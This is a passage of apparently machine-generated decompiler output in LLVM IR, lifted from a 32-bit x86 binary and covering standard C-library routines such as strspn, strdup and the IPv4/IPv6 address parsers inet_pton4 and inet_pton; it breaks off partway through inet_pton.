dec_label_pc_8056fb8:                             ; preds = %dec_label_pc_8056f64, %dec_label_pc_8056fb0, %dec_label_pc_8056fa8, %dec_label_pc_8056fa0, %dec_label_pc_8056f98
  %v0_8056fba = phi i32 [ %v1_8056fb0, %dec_label_pc_8056fb0 ], [ %v1_8056fa8, %dec_label_pc_8056fa8 ], [ %v1_8056fa0, %dec_label_pc_8056fa0 ], [ %v0_8056f84, %dec_label_pc_8056f98 ], [ %v0_8056f68, %dec_label_pc_8056f64 ]
  store i32 %v0_8056f59, i32* @ebx, align 4
  ret i32 %v0_8056fba

; uselistorder directives
  uselistorder i32 %v1_8056f8d, { 1, 0 }
  uselistorder i32 %v1_8056f84, { 2, 1, 0 }
  uselistorder i32 %v2_8056f77, { 1, 0 }
  uselistorder i32 %v1_8056f68, { 1, 0, 2 }
  uselistorder i32 %v4_8056f5e, { 2, 1, 0 }
  uselistorder i32 %v4_8056f5a, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056fb8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056f6d, { 1, 0 }
  uselistorder label %dec_label_pc_8056f64, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8056fde30 = load i8, i8* %arg1, align 1
  %v4_8056fe034 = icmp eq i8 %v2_8056fde30, 0
  br i1 %v4_8056fe034, label %dec_label_pc_8056fe8, label %dec_label_pc_8056fe4.lr.ph

dec_label_pc_8056fe4.lr.ph:                       ; preds = %entry
  %v3_8056fde31 = zext i8 %v2_8056fde30 to i32
  %v4_8056fde.pre = load i32, i32* @eax, align 4
  %v5_8056fde32 = and i32 %v4_8056fde.pre, -256
  %v6_8056fde33 = or i32 %v3_8056fde31, %v5_8056fde32
  %v4_8056fc5 = ptrtoint i8* %arg1 to i32
  %v1_8056fd018 = inttoptr i32 %arg2 to i8*
  %v4_8056fd0.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056fe4

dec_label_pc_8056fcb:                             ; preds = %dec_label_pc_8056fe4, %dec_label_pc_8056fcf
  %v6_8056fd027 = phi i32 [ %v6_8056fd0, %dec_label_pc_8056fcf ], [ %v6_8056fd022, %dec_label_pc_8056fe4 ]
  %v2_8056fd026 = phi i8 [ %v2_8056fd0, %dec_label_pc_8056fcf ], [ %v2_8056fd019, %dec_label_pc_8056fe4 ]
  %v0_8056fcf25 = phi i32 [ %v1_8056fcf, %dec_label_pc_8056fcf ], [ %arg2, %dec_label_pc_8056fe4 ]
  %v15_8056fcb = icmp eq i8 %v2_8056fde37, %v2_8056fd026
  br i1 %v15_8056fcb, label %dec_label_pc_8056fd8, label %dec_label_pc_8056fcf

dec_label_pc_8056fcf:                             ; preds = %dec_label_pc_8056fcb
  %v1_8056fcf = add i32 %v0_8056fcf25, 1
  store i32 %v1_8056fcf, i32* @edx, align 4
  %v1_8056fd0 = inttoptr i32 %v1_8056fcf to i8*
  %v2_8056fd0 = load i8, i8* %v1_8056fd0, align 1
  %v3_8056fd0 = zext i8 %v2_8056fd0 to i32
  %v5_8056fd0 = and i32 %v6_8056fd027, -256
  %v6_8056fd0 = or i32 %v3_8056fd0, %v5_8056fd0
  store i32 %v6_8056fd0, i32* @ecx, align 4
  %v4_8056fd2 = icmp eq i8 %v2_8056fd0, 0
  %v1_8056fd4 = icmp eq i1 %v4_8056fd2, false
  br i1 %v1_8056fd4, label %dec_label_pc_8056fcb, label %dec_label_pc_8056fe8

dec_label_pc_8056fd8:                             ; preds = %dec_label_pc_8056fcb
  %v1_8056fdc = add i32 %v0_8056fe835, 1
  %v1_8056fdd = add i32 %v0_8056fdd36, 1
  %v1_8056fde = inttoptr i32 %v1_8056fdd to i8*
  %v2_8056fde = load i8, i8* %v1_8056fde, align 1
  %v3_8056fde = zext i8 %v2_8056fde to i32
  %v5_8056fde = and i32 %v6_8056fde38, -256
  %v6_8056fde = or i32 %v3_8056fde, %v5_8056fde
  %v4_8056fe0 = icmp eq i8 %v2_8056fde, 0
  br i1 %v4_8056fe0, label %dec_label_pc_8056fe8, label %dec_label_pc_8056fe4

dec_label_pc_8056fe4:                             ; preds = %dec_label_pc_8056fe4.lr.ph, %dec_label_pc_8056fd8
  %v4_8056fd0.pre = phi i32 [ %v4_8056fd0.pre.pre, %dec_label_pc_8056fe4.lr.ph ], [ %v6_8056fd027, %dec_label_pc_8056fd8 ]
  %v6_8056fde38 = phi i32 [ %v6_8056fde33, %dec_label_pc_8056fe4.lr.ph ], [ %v6_8056fde, %dec_label_pc_8056fd8 ]
  %v2_8056fde37 = phi i8 [ %v2_8056fde30, %dec_label_pc_8056fe4.lr.ph ], [ %v2_8056fde, %dec_label_pc_8056fd8 ]
  %v0_8056fdd36 = phi i32 [ %v4_8056fc5, %dec_label_pc_8056fe4.lr.ph ], [ %v1_8056fdd, %dec_label_pc_8056fd8 ]
  %v0_8056fe835 = phi i32 [ 0, %dec_label_pc_8056fe4.lr.ph ], [ %v1_8056fdc, %dec_label_pc_8056fd8 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8056fd019 = load i8, i8* %v1_8056fd018, align 1
  %v3_8056fd020 = zext i8 %v2_8056fd019 to i32
  %v5_8056fd021 = and i32 %v4_8056fd0.pre, -256
  %v6_8056fd022 = or i32 %v3_8056fd020, %v5_8056fd021
  store i32 %v6_8056fd022, i32* @ecx, align 4
  %v4_8056fd223 = icmp eq i8 %v2_8056fd019, 0
  %v1_8056fd424 = icmp eq i1 %v4_8056fd223, false
  br i1 %v1_8056fd424, label %dec_label_pc_8056fcb, label %dec_label_pc_8056fe8

dec_label_pc_8056fe8:                             ; preds = %entry, %dec_label_pc_8056fd8, %dec_label_pc_8056fe4, %dec_label_pc_8056fcf
  %v0_8056fe817 = phi i32 [ %v0_8056fe835, %dec_label_pc_8056fcf ], [ %v0_8056fe835, %dec_label_pc_8056fe4 ], [ 0, %entry ], [ %v1_8056fdc, %dec_label_pc_8056fd8 ]
  ret i32 %v0_8056fe817

; uselistorder directives
  uselistorder i32 %v6_8056fd022, { 1, 0 }
  uselistorder i8 %v2_8056fd019, { 1, 2, 0 }
  uselistorder i32 %v1_8056fdd, { 1, 0 }
  uselistorder i32 %v6_8056fd0, { 1, 0 }
  uselistorder i8 %v2_8056fd0, { 1, 2, 0 }
  uselistorder i32 %v1_8056fcf, { 2, 1, 0 }
  uselistorder i8 %v2_8056fde30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056fe8, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8056fe4, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056ff0 = load i32, i32* @edi, align 4
  %v0_8056ff1 = load i32, i32* @esi, align 4
  %v0_8056ff2 = load i32, i32* @ebx, align 4
  store i32 %v0_8056ff2, i32* %stack_var_-12, align 4
  %v4_8056ff3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056ff3, i32* @edi, align 4
  %v3_8056ffb = call i32 @strlen(i8* %arg1)
  %v1_8057000 = add i32 %v3_8056ffb, 1
  store i32 %v1_8057000, i32* @esi, align 4
  %v2_8057006 = call i32 @malloc(i32 %v1_8057000)
  store i32 %v2_8057006, i32* %ebx.global-to-local, align 4
  %v1_8057010 = icmp eq i32 %v2_8057006, 0
  br i1 %v1_8057010, label %dec_label_pc_8057020, label %dec_label_pc_8057014

dec_label_pc_8057014:                             ; preds = %entry
  %v0_8057015 = load i32, i32* @esi, align 4
  %v0_8057016 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8057006 to i16*
  %v6_8057018 = call i32 @memcpy(i16* %tmp11, i32 %v0_8057016, i32 %v0_8057015)
  %v0_8057020.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057020

dec_label_pc_8057020:                             ; preds = %entry, %dec_label_pc_8057014
  %v0_8057020 = phi i32 [ 0, %entry ], [ %v0_8057020.pre, %dec_label_pc_8057014 ]
  %v2_8057022 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057022, i32* @ebx, align 4
  store i32 %v0_8056ff1, i32* @esi, align 4
  store i32 %v0_8056ff0, i32* @edi, align 4
  ret i32 %v0_8057020

; uselistorder directives
  uselistorder i32 %v2_8057006, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 7, 6, 5, 4, 3, 1, 15, 14, 13, 12, 11, 10, 9, 8, 2, 0 }
  uselistorder label %dec_label_pc_8057020, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805702a = load i32, i32* @esi, align 4
  %v0_8057031 = load i32, i32* @eax, align 4
  store i32 %v0_8057031, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8057037 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057037, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805707f15 = inttoptr i32 %v0_8057031 to i8*
  %v2_805707f16 = load i8, i8* %v1_805707f15, align 1
  %v3_805707f17 = sext i8 %v2_805707f16 to i32
  store i32 %v3_805707f17, i32* @ecx, align 4
  %v1_805708218 = add i32 %v0_8057031, 1
  store i32 %v1_805708218, i32* %ebx.global-to-local, align 4
  %v1_805708319 = icmp eq i8 %v2_805707f16, 0
  %v1_805708520 = icmp eq i1 %v1_805708319, false
  br i1 %v1_805708520, label %dec_label_pc_8057042, label %dec_label_pc_8057087.thread

dec_label_pc_8057087.thread:                      ; preds = %entry
  br label %dec_label_pc_80570a4

dec_label_pc_8057042:                             ; preds = %entry, %dec_label_pc_805707f.backedge
  %v3_805707f22 = phi i32 [ %v3_805707f, %dec_label_pc_805707f.backedge ], [ %v3_805707f17, %entry ]
  %v2_805707f21 = phi i8 [ %v2_805707f, %dec_label_pc_805707f.backedge ], [ %v2_805707f16, %entry ]
  %v1_8057042 = add nsw i32 %v3_805707f22, -48
  store i32 %v1_8057042, i32* %eax.global-to-local, align 4
  %v6_8057048 = icmp ugt i32 %v1_8057042, 9
  br i1 %v6_8057048, label %dec_label_pc_805706b, label %dec_label_pc_805704a

dec_label_pc_805704a:                             ; preds = %dec_label_pc_8057042
  %v0_805704a = load i32, i32* @esi, align 4
  %v1_805704a = inttoptr i32 %v0_805704a to i8*
  %v2_805704a = load i8, i8* %v1_805704a, align 1
  %v2_805704d = zext i8 %v2_805704a to i32
  %v3_805704d = mul nuw nsw i32 %v2_805704d, 10
  %v3_8057050 = add nsw i32 %v3_805704d, %v1_8057042
  store i32 %v3_8057050, i32* %eax.global-to-local, align 4
  %v6_8057059 = icmp ugt i32 %v3_8057050, 255
  br i1 %v6_8057059, label %dec_label_pc_80570a4, label %dec_label_pc_805705b

dec_label_pc_805705b:                             ; preds = %dec_label_pc_805704a
  %v1_805705b = trunc i32 %v3_8057050 to i8
  store i8 %v1_805705b, i8* %v1_805704a, align 1
  %v0_805705d = load i32, i32* @edx, align 4
  %v1_805705d = icmp eq i32 %v0_805705d, 0
  %v1_805705f = icmp eq i1 %v1_805705d, false
  br i1 %v1_805705f, label %dec_label_pc_805707f.backedge, label %dec_label_pc_8057061

dec_label_pc_8057061:                             ; preds = %dec_label_pc_805705b
  %v0_8057061 = load i32, i32* @edi, align 4
  %v1_8057061 = add i32 %v0_8057061, 1
  store i32 %v1_8057061, i32* @edi, align 4
  %v1_8057062 = add i32 %v0_8057061, -3
  %v6_8057062 = sub i32 2, %v0_8057061
  %v7_8057062 = and i32 %v6_8057062, %v1_8057061
  %v8_8057062 = icmp slt i32 %v7_8057062, 0
  %v9_8057062 = icmp eq i32 %v1_8057062, 0
  %v10_8057062 = icmp slt i32 %v1_8057062, 0
  %v3_8057065 = icmp eq i1 %v10_8057062, %v8_8057062
  %v4_8057065 = icmp eq i1 %v9_8057062, false
  %v5_8057065 = and i1 %v4_8057065, %v3_8057065
  br i1 %v5_8057065, label %dec_label_pc_80570a4, label %dec_label_pc_8057067

dec_label_pc_8057067:                             ; preds = %dec_label_pc_8057061
  %v1_8057067 = and i32 %v0_805705d, -256
  %v2_8057067 = or i32 %v1_8057067, 1
  store i32 %v2_8057067, i32* @edx, align 4
  br label %dec_label_pc_805707f.backedge

dec_label_pc_805706b:                             ; preds = %dec_label_pc_8057042
  %v9_805706b = icmp eq i8 %v2_805707f21, 46
  %v1_805706e = icmp eq i1 %v9_805706b, false
  br i1 %v1_805706e, label %dec_label_pc_80570a4, label %dec_label_pc_8057070

dec_label_pc_8057070:                             ; preds = %dec_label_pc_805706b
  %v0_8057070 = load i32, i32* @edx, align 4
  %v1_8057070 = icmp eq i32 %v0_8057070, 0
  br i1 %v1_8057070, label %dec_label_pc_80570a4, label %dec_label_pc_8057074

dec_label_pc_8057074:                             ; preds = %dec_label_pc_8057070
  %v0_8057074 = load i32, i32* @edi, align 4
  %v9_8057074 = icmp eq i32 %v0_8057074, 4
  br i1 %v9_8057074, label %dec_label_pc_80570a4, label %dec_label_pc_8057079

dec_label_pc_8057079:                             ; preds = %dec_label_pc_8057074
  %v0_8057079 = load i32, i32* @esi, align 4
  %v1_8057079 = add i32 %v0_8057079, 1
  store i32 %v1_8057079, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_805707c = inttoptr i32 %v1_8057079 to i8*
  store i8 0, i8* %v1_805707c, align 1
  br label %dec_label_pc_805707f.backedge

dec_label_pc_805707f.backedge:                    ; preds = %dec_label_pc_8057079, %dec_label_pc_8057067, %dec_label_pc_805705b
  %v0_805707f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805707f = inttoptr i32 %v0_805707f.pre to i8*
  %v2_805707f = load i8, i8* %v1_805707f, align 1
  %v3_805707f = sext i8 %v2_805707f to i32
  store i32 %v3_805707f, i32* @ecx, align 4
  %v1_8057082 = add i32 %v0_805707f.pre, 1
  store i32 %v1_8057082, i32* %ebx.global-to-local, align 4
  %v1_8057083 = icmp eq i8 %v2_805707f, 0
  %v1_8057085 = icmp eq i1 %v1_8057083, false
  br i1 %v1_8057085, label %dec_label_pc_8057042, label %dec_label_pc_8057087

dec_label_pc_8057087:                             ; preds = %dec_label_pc_805707f.backedge
  %v0_8057087.pre = load i32, i32* @edi, align 4
  %v7_805708a = icmp sgt i32 %v0_8057087.pre, 3
  br i1 %v7_805708a, label %dec_label_pc_805708c, label %dec_label_pc_80570a4

dec_label_pc_805708c:                             ; preds = %dec_label_pc_8057087
  %v0_805708c = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_8057037, i32* %eax.global-to-local, align 4
  %v3_8057095 = bitcast i32* %stack_var_-20 to i16*
  %v4_8057095 = call i32 @memcpy(i16* %v3_8057095, i32 4, i32 %v0_805708c)
  br label %dec_label_pc_80570a6

dec_label_pc_80570a4:                             ; preds = %dec_label_pc_8057074, %dec_label_pc_8057070, %dec_label_pc_805706b, %dec_label_pc_8057061, %dec_label_pc_805704a, %dec_label_pc_8057087.thread, %dec_label_pc_8057087
  br label %dec_label_pc_80570a6

dec_label_pc_80570a6:                             ; preds = %dec_label_pc_805708c, %dec_label_pc_80570a4
  %storemerge = phi i32 [ 0, %dec_label_pc_80570a4 ], [ 1, %dec_label_pc_805708c ]
  %v0_80570ad = phi i32 [ 0, %dec_label_pc_80570a4 ], [ 1, %dec_label_pc_805708c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805702a, i32* @esi, align 4
  ret i32 %v0_80570ad

; uselistorder directives
  uselistorder i32 %v3_805707f, { 1, 0 }
  uselistorder i8 %v2_805707f, { 1, 2, 0 }
  uselistorder i32 %v1_8057062, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 0, 1, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_80570a6, { 1, 0 }
  uselistorder label %dec_label_pc_80570a4, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8057042, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80570ae = load i32, i32* @ebp, align 4
  %v0_80570af = load i32, i32* @edi, align 4
  %v0_80570b0 = load i32, i32* @esi, align 4
  %v0_80570b1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80570b9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80570b9, i32* @edi, align 4
  %v9_80570bd = icmp eq i32 %arg1, 2
  br i1 %v9_80570bd, label %dec_label_pc_80570cd, label %dec_label_pc_80570c2

dec_label_pc_80570c2:                             ; preds = %entry
  %v9_80570c2 = icmp eq i32 %arg1, 10
  %v1_80570c5 = icmp eq i1 %v9_80570c2, false
  br i1 %v1_80570c5, label %dec_label_pc_805725e, label %dec_label_pc_80570dd

dec_label_pc_80570cd:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80570b9, i32* @eax, align 4
  %v3_80570d3 = call i32 @inet_pton4(i32 %v0_80570b1, i32 %v0_80570b0, i32 %v0_80570af)
  store i32 %v3_80570d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057270

dec_label_pc_80570dd:                             ; preds = %dec_label_pc_80570c2
  %v2_80570e2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80570e2, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_80570e7 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_80570e7, i32* @ebx, align 4
  %v2_80570ee = add i32 %v5_80570e7, 16
  store i32 %v2_80570ee, i32* %eax.global-to-local, align 4
  %v0_80570f8 = load i32, i32* @edi, align 4
  %v1_80570f8 = inttoptr i32 %v0_80570f8 to i8*
  %v2_80570f8 = load i8, i8* %v1_80570f8, align 1
  %v11_80570f8 = icmp eq i8 %v2_80570f8, 58
  %v1_80570fb = icmp eq i1 %v11_80570f8, false
  br i1 %v1_80570fb, label %dec_label_pc_805718e, label %dec_label_pc_80570fd

dec_label_pc_80570fd:                             ; preds = %dec_label_pc_80570dd
  %v1_80570fd = add i32 %v0_80570f8, 1
  store i32 %v1_80570fd, i32* @edi, align 4
  %v1_80570fe = inttoptr i32 %v1_80570fd to i8*
  %v2_80570fe = load i8, i8* %v1_80570fe, align 1
  %v11_80570fe = icmp eq i8 %v2_80570fe, 58
  %v1_8057101 = icmp eq i1 %v11_80570fe, false
  br i1 %v1_8057101, label %dec_label_pc_805726e, label %dec_label_pc_805718e

dec_label_pc_8057115:                             ; preds = %dec_label_pc_80571ce
  %v4_805711d = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805e394.1032, i32 0, i32 0), i32 %v2_80571d5)
  store i32 %v4_805711d, i32* %eax.global-to-local, align 4
  %v0_8057122 = load i32, i32* @edi, align 4
  %v1_8057122 = add i32 %v0_8057122, 1
  store i32 %v1_8057122, i32* @edi, align 4
  %v1_8057126 = icmp eq i32 %v4_805711d, 0
  br i1 %v1_8057126, label %dec_label_pc_8057145, label %dec_label_pc_805712a

dec_label_pc_805712a:                             ; preds = %dec_label_pc_8057115
  %v0_805712a = load i32, i32* @ebp, align 4
  %v2_805712a = mul i32 %v0_805712a, 16
  %v1_805712d = add i32 %v4_805711d, -134603668
  store i32 %v1_805712d, i32* %eax.global-to-local, align 4
  %v2_8057132 = or i32 %v2_805712a, %v1_805712d
  store i32 %v2_8057132, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_8057132, 65536
  br i1 %tmp127, label %dec_label_pc_80571ce.outer, label %dec_label_pc_805726e

dec_label_pc_80571ce.outer:                       ; preds = %dec_label_pc_805712a, %dec_label_pc_805718e
  %v0_80571d137 = phi i32 [ %v1_8057122, %dec_label_pc_805712a ], [ %stack_var_-36.0.in, %dec_label_pc_805718e ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805712a ], [ %stack_var_-44.0, %dec_label_pc_805718e ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805712a ], [ %stack_var_-36.0, %dec_label_pc_805718e ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805712a ], [ 0, %dec_label_pc_805718e ]
  %v4_805714a = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805714f = icmp eq i1 %v4_805714a, false
  br label %dec_label_pc_80571ce

dec_label_pc_8057145:                             ; preds = %dec_label_pc_8057115
  %v0_8057145 = load i32, i32* @esi, align 4
  %v9_8057145 = icmp eq i32 %v0_8057145, 58
  %v1_8057148 = icmp eq i1 %v9_8057145, false
  br i1 %v1_8057148, label %dec_label_pc_805719a, label %dec_label_pc_805714a

dec_label_pc_805714a:                             ; preds = %dec_label_pc_8057145
  br i1 %v1_805714f, label %dec_label_pc_8057166, label %dec_label_pc_8057151

dec_label_pc_8057151:                             ; preds = %dec_label_pc_805714a
  %v5_8057151 = icmp eq i8* %stack_var_-44.1, null
  %v1_8057156 = icmp eq i1 %v5_8057151, false
  br i1 %v1_8057156, label %dec_label_pc_805726e, label %dec_label_pc_805715c

dec_label_pc_805715c:                             ; preds = %dec_label_pc_8057151
  %v0_805715c = load i32, i32* @ebx, align 4
  %v5_805715c = inttoptr i32 %v0_805715c to i8*
  %v5_8057160 = inttoptr i32 %v1_8057122 to i8*
  br label %dec_label_pc_80571ce

dec_label_pc_8057166:                             ; preds = %dec_label_pc_805714a
  %v1_8057166 = inttoptr i32 %v1_8057122 to i8*
  %v2_8057166 = load i8, i8* %v1_8057166, align 1
  %v3_8057166 = icmp eq i8 %v2_8057166, 0
  br i1 %v3_8057166, label %dec_label_pc_805726e, label %dec_label_pc_805716f

dec_label_pc_805716f:                             ; preds = %dec_label_pc_8057166
  %v0_805716f = load i32, i32* @ebx, align 4
  %v1_805716f = add i32 %v0_805716f, 2
  store i32 %v1_805716f, i32* @edx, align 4
  %v6_8057176 = icmp ugt i32 %v1_805716f, %v2_80570ee
  br i1 %v6_8057176, label %dec_label_pc_805726e, label %dec_label_pc_805717c

dec_label_pc_805717c:                             ; preds = %dec_label_pc_805716f
  %v0_805717c = load i32, i32* @ebp, align 4
  %v2_805717e = udiv i32 %v0_805717c, 256
  %v4_805717e = trunc i32 %v2_805717e to i8
  %v3_8057181 = inttoptr i32 %v0_805716f to i8*
  store i8 %v4_805717e, i8* %v3_8057181, align 1
  %v0_8057183 = load i32, i32* @ebp, align 4
  store i32 %v0_8057183, i32* %eax.global-to-local, align 4
  %v1_8057185 = trunc i32 %v0_8057183 to i8
  %v2_8057185 = load i32, i32* @ebx, align 4
  %v3_8057185 = add i32 %v2_8057185, 1
  %v4_8057185 = inttoptr i32 %v3_8057185 to i8*
  store i8 %v1_8057185, i8* %v4_8057185, align 1
  %v0_8057188 = load i32, i32* @edx, align 4
  store i32 %v0_8057188, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805718e

dec_label_pc_805718e:                             ; preds = %dec_label_pc_80570dd, %dec_label_pc_80570fd, %dec_label_pc_805717c
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805717c ], [ %v1_80570fd, %dec_label_pc_80570fd ], [ %v0_80570f8, %dec_label_pc_80570dd ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805717c ], [ null, %dec_label_pc_80570fd ], [ null, %dec_label_pc_80570dd ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80571ce.outer

dec_label_pc_805719a:                             ; preds = %dec_label_pc_8057145
  %v9_805719a = icmp eq i32 %v0_8057145, 46
  %v1_805719d = icmp eq i1 %v9_805719a, false
  br i1 %v1_805719d, label %dec_label_pc_805726e, label %dec_label_pc_80571a3

dec_label_pc_80571a3:                             ; preds = %dec_label_pc_805719a
  %v0_80571a3 = load i32, i32* @ebx, align 4
  %v1_80571a3 = add i32 %v0_80571a3, 4
  store i32 %v1_80571a3, i32* @esi, align 4
  %v6_80571aa = icmp ugt i32 %v1_80571a3, %v2_80570ee
  br i1 %v6_80571aa, label %dec_label_pc_805726e, label %dec_label_pc_80571b0

dec_label_pc_80571b0:                             ; preds = %dec_label_pc_80571a3
  store i32 %v0_80571a3, i32* @edx, align 4
  %v4_80571b2 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80571b2, i32* @eax, align 4
  %v2_80571b6 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80571b6 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_80571b6, i32 %v2_80570ee)
  store i32 %v5_80571b6, i32* %eax.global-to-local, align 4
  %v0_80571bb = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_80571b6, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_8057205, label %dec_label_pc_805726e

dec_label_pc_80571ce:                             ; preds = %dec_label_pc_80571ce.outer, %dec_label_pc_805715c
  %v0_80571d1 = phi i32 [ %v1_8057122, %dec_label_pc_805715c ], [ %v0_80571d137, %dec_label_pc_80571ce.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805715c, %dec_label_pc_805715c ], [ %stack_var_-44.1.ph, %dec_label_pc_80571ce.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8057160, %dec_label_pc_805715c ], [ %stack_var_-36.1.ph, %dec_label_pc_80571ce.outer ]
  %v1_80571d1 = inttoptr i32 %v0_80571d1 to i8*
  %v2_80571d1 = load i8, i8* %v1_80571d1, align 1
  %v3_80571d1 = sext i8 %v2_80571d1 to i32
  store i32 %v3_80571d1, i32* %eax.global-to-local, align 4
  %v2_80571d5 = call i32 @__GI_tolower(i32 %v3_80571d1)
  store i32 %v2_80571d5, i32* %eax.global-to-local, align 4
  store i32 %v2_80571d5, i32* @esi, align 4
  %v1_80571df = icmp eq i32 %v2_80571d5, 0
  %v1_80571e1 = icmp eq i1 %v1_80571df, false
  br i1 %v1_80571e1, label %dec_label_pc_8057115, label %dec_label_pc_80571e7

dec_label_pc_80571e7:                             ; preds = %dec_label_pc_80571ce
  %v0_805723d.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_805714a, label %dec_label_pc_8057205, label %dec_label_pc_80571ee

dec_label_pc_80571ee:                             ; preds = %dec_label_pc_80571e7
  %v1_80571ee = add i32 %v0_805723d.pre.pre, 2
  store i32 %v1_80571ee, i32* @edx, align 4
  %v6_80571f5 = icmp ugt i32 %v1_80571ee, %v2_80570ee
  br i1 %v6_80571f5, label %dec_label_pc_805726e, label %dec_label_pc_80571f7

dec_label_pc_80571f7:                             ; preds = %dec_label_pc_80571ee
  %v0_80571f7 = load i32, i32* @ebp, align 4
  %v2_80571f9 = udiv i32 %v0_80571f7, 256
  %v4_80571f9 = trunc i32 %v2_80571f9 to i8
  %v3_80571fc = inttoptr i32 %v0_805723d.pre.pre to i8*
  store i8 %v4_80571f9, i8* %v3_80571fc, align 1
  %v0_80571fe = load i32, i32* @ebp, align 4
  store i32 %v0_80571fe, i32* %eax.global-to-local, align 4
  %v1_8057200 = trunc i32 %v0_80571fe to i8
  %v2_8057200 = load i32, i32* @ebx, align 4
  %v3_8057200 = add i32 %v2_8057200, 1
  %v4_8057200 = inttoptr i32 %v3_8057200 to i8*
  store i8 %v1_8057200, i8* %v4_8057200, align 1
  %v0_8057203 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8057205

dec_label_pc_8057205:                             ; preds = %dec_label_pc_80571e7, %dec_label_pc_80571b0, %dec_label_pc_80571f7
  %v0_805723d.pre = phi i32 [ %v0_80571bb, %dec_label_pc_80571b0 ], [ %v0_8057203, %dec_label_pc_80571f7 ], [ %v0_805723d.pre.pre, %dec_label_pc_80571e7 ]
  %v4_8057205 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8057205 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8057205, label %dec_label_pc_805723d, label %dec_label_pc_805720c

dec_label_pc_805720c:                             ; preds = %dec_label_pc_8057205
  store i32 1, i32* @esi, align 4
  %v6_8057213 = sub i32 %v0_805723d.pre, %v4_8057205
  store i32 %v6_8057213, i32* @edi, align 4
  %v16_8057217 = icmp eq i32 %v0_805723d.pre, %v2_80570ee
  %v1_805721b = icmp eq i1 %v16_8057217, false
  br i1 %v1_805721b, label %dec_label_pc_8057235.preheader, label %dec_label_pc_805726e

dec_label_pc_8057235.preheader:                   ; preds = %dec_label_pc_805720c
  %v3_805723595 = inttoptr i32 %v6_8057213 to i8*
  %v9_805723798 = icmp slt i8* %v3_805723595, inttoptr (i32 1 to i8*)
  br i1 %v9_805723798, label %dec_label_pc_805723d.thread, label %dec_label_pc_805721f

dec_label_pc_805721f:                             ; preds = %dec_label_pc_8057235.preheader, %dec_label_pc_805721f
  %v0_805722d100 = phi i32 [ %v0_8057235.pre, %dec_label_pc_805721f ], [ 1, %dec_label_pc_8057235.preheader ]
